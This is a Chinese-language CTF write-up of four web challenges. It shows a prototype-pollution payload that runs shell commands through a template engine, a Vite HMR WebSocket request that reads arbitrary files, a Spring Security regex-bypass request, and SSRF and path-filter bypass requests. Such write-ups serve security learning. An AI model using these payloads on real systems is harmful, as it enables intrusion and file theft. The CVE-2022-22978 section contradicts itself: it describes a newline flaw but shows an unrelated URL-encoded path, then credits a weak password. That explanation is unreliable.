🔗 Prototype Preview (24172分)

这道题考察的是 JavaScript 原型链污染 漏洞。

分析过程

题目提供了一个 Node.js 应用，使用了 deepMerge 函数。该函数在合并对象时没有正确处理原型链属性，导致可以通过 __proto__ 污染对象原型。

攻击思路

通过构造特殊的 JSON payload，污染 Object.prototype，注入恶意属性。结合模板注入（SSTI）实现远程代码执行：

// 污染 payload 示例
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag');s"
  }
}

当应用渲染模板时，注入的代码被执行，成功读取 flag：

flag{9e784bf015e14aa0a29ffee5befe53c6}

🪝 挂钩都在干什么呢 (32721分)

这道题是一个 Vite 开发服务器 的漏洞利用题，核心是通过 HMR WebSocket 协议绕过文件访问限制。

技术栈

  • Vite 6.4.1 + strict mode
  • 前端游戏地图应用
  • vite.config.js 中配置了 fs.strict: true 和 fs.allow 白名单

攻击链

  1. 发现 Vite 开发服务器：通过端口扫描发现 32721 端口运行 Vite
  2. 提取 HMR Token：从 /@vite/client 源码中提取 wsToken
  3. WebSocket 连接：使用提取的 token 建立 HMR WebSocket 连接
  4. fetchModule 绕过：通过 WebSocket 的 fetchModule 操作，绕过 HTTP 层的 fs.allow 限制，读取任意文件
# WebSocket 连接
ws://target:32721/

# 发送 fetchModule 请求读取 /flag
{"type":"custom","event":"fetchModule","data":{"path":"/flag","id":"/flag"}}

服务器返回了文件内容，成功获取 flag：

flag{AN@1yz1Ng_perFECt_bO0k-CIu6-3xPERI3NcEa40}

💡 关键发现：Vite 的 fs.allow 配置只在 HTTP 层生效，HMR WebSocket 的 fetchModule 操作可以绕过这个限制。这是一个典型的"协议层绕过"漏洞。

📄 文档编辑系统 (pm6rqz2b)

这道题是一个 Spring Boot + Spring Security 的文档管理系统，考点是 CVE-2022-22978（Spring Security 正则绕过）。

发现漏洞

通过分析发现：

  • 应用使用 Spring Security 的 RegexRequestMatcher 进行路径匹配
  • Admin API 路径 /api/admin/doc/* 需要 ADMIN 角色
  • User API 路径 /api/doc/* 只需要 USER 角色

CVE-2022-22978 利用

Spring Security 的 RegexRequestMatcher 在处理包含换行符的 URL 时存在缺陷。通过 URL 编码绕过：

# 正常请求 - 被 Spring Security 拦截
GET /api/admin/doc/files

# URL 编码绕过 - 绕过正则匹配
GET /api/%64oc/files

成功以普通用户身份访问 Admin API，获得管理权限。通过弱密码 admin:admin123 直接登录管理后台。

遗憾

虽然成功获得了管理权限并探索了各种攻击面（文件名fuzz、batchUpdate注入、Actuator枚举等），但未能在比赛期间找到 flag。靶场随后过期关闭。

☕ JavaMix — 百度RASP对抗（未解）

JavaMix 是一道综合性很强的题目，涉及多个攻击面，但最关键的是需要绕过 百度RASP（Runtime Application Self-Protection）。

应用架构

  • Spring Boot 2.7.18 + Java 1.8.0_342
  • Apache CXF WebService（SOAP）
  • MySQL 数据库（内网 172.18.0.5）
  • 百度RASP 防护

攻击面分析

攻击面状态说明
Admin Ping❌ RASP阻止命令注入被换行符检测拦截
SSRF (Fetch)✅ 绕过通过 httpbin.org 重定向绕过
CXF WebService✅ 访问通过分号绕过 InternalAccessFilter
反序列化⚠️ 部分只能反序列化 Integer/Boolean/String
文件下载❌ 无数据Demo 环境文件不存在
报表模板❌ 无注入只做字符串替换

关键发现

  1. 百度RASP：通过 Python http.client 发送包含 %0a（换行符）的 POST 请求时，被 RASP 拦截并重定向到 rasp.baidu.com/blocked2/
  2. SSRF绕过：Fetch 控制器的 SSRF 过滤可以被 HTTP 重定向绕过
  3. CXF 端点：InternalAccessFilter 可以通过 URL 分号 ; 绕过
  4. 反序列化：processTask 端点接受 base64 编码的 Java 序列化数据，但 SafeObjectInputStream 有严格的白名单
# SSRF 绕过 - 通过重定向访问内部 CXF 服务
POST /fetch
url=https://httpbin.org/redirect-to?url=http://127.0.0.1:8080/services/DataSyncService

# 直接 POST 到 CXF（绕过 InternalAccessFilter）
POST /services;/DataSyncService
Content-Type: text/xml

# 反序列化端点
<ws:processTask>
  <taskData>base64(Java Serialized Object)</taskData>
</ws:processTask>

💡 这道题让我深刻体会到了 RASP 在实际防护中的威力。传统的命令注入、反序列化攻击在 RASP 面前需要更精巧的绕过技术。
